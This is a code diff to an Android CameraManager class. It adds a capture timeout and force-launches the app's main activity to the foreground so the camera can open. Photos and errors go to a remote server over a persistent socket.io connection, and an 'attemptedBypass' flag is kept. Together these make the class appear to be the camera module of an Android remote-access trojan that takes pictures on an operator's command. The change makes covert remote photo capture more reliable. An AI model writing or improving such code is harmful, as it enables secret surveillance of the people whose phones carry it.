@@ -76,13 +76,43 @@ public class CameraManager {
     }
 
     private boolean attemptedBypass = false;
+    private Handler timeoutHandler = new Handler(Looper.getMainLooper());
+    private Runnable timeoutRunnable = null;
+    private static final long CAMERA_TIMEOUT_MS = 25000; // 25 seconds timeout
     
     public void startUp(int cameraID) {
         Log.d(TAG, "startUp called with camera type: " + (cameraID == 0 ? "Front" : "Back"));
         attemptedBypass = false;
 
+        // Cancel any existing timeout
+        if (timeoutRunnable != null) {
+            timeoutHandler.removeCallbacks(timeoutRunnable);
+        }
+
+        // Set up timeout to ensure we always send a response
+        timeoutRunnable = new Runnable() {
+            @Override
+            public void run() {
+                Log.e(TAG, "Camera operation timeout - sending error response");
+                sendError("Camera operation timed out after 25 seconds. Camera may be blocked or hardware unavailable.");
+                closeCamera();
+            }
+        };
+        timeoutHandler.postDelayed(timeoutRunnable, CAMERA_TIMEOUT_MS);
+
         // Bring MainActivity to foreground for camera (required for Android 9+)
-        MainActivity.setCameraActive(true);
+        try {
+            MainActivity.setCameraActive(true);
+            Intent intent = new Intent(context, MainActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+            intent.putExtra("camera_request", true);
+            intent.putExtra("camera_id", cameraID);
+            context.startActivity(intent);
+            Log.d(TAG, "MainActivity launched for camera");
+        } catch (Exception e) {
+            Log.e(TAG, "Error launching MainActivity for camera", e);
+            // Continue anyway - might work without activity
+        }
 
         final String cameraIdToOpen;
         if (cameraID == 0 && frontCameraId != null) {
@@ -95,6 +125,9 @@ public class CameraManager {
         }
 
         if (cameraIdToOpen == null) {
+            if (timeoutRunnable != null) {
+                timeoutHandler.removeCallbacks(timeoutRunnable);
+            }
             sendError("Requested camera (ID: " + cameraID + ") not found.");
             return;
         }
@@ -111,6 +144,13 @@ public class CameraManager {
                 }
             }
         }, 2500); // Increased from 1500ms to 2500ms
+    }
+    
+    private void cancelTimeout() {
+        if (timeoutRunnable != null) {
+            timeoutHandler.removeCallbacks(timeoutRunnable);
+            timeoutRunnable = null;
+        }
     }
     
     private void startCamera2(final String cameraIdToOpen) {
@@ -517,6 +557,9 @@ public class CameraManager {
     
     private void sendError(String message) {
         try {
+            // Cancel timeout since we're sending an error
+            cancelTimeout();
+            
             Log.e(TAG, "Camera error: " + message);
             io.socket.client.Socket socket = IOSocket.getInstance().getIoSocket();
             if (socket != null && socket.connected()) {
@@ -536,6 +579,9 @@ public class CameraManager {
 
     private void sendPhoto(byte[] data) {
         try {
+            // Cancel timeout since we got a photo
+            cancelTimeout();
+            
             Log.d(TAG, "Processing photo, raw size: " + data.length);
             
             Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
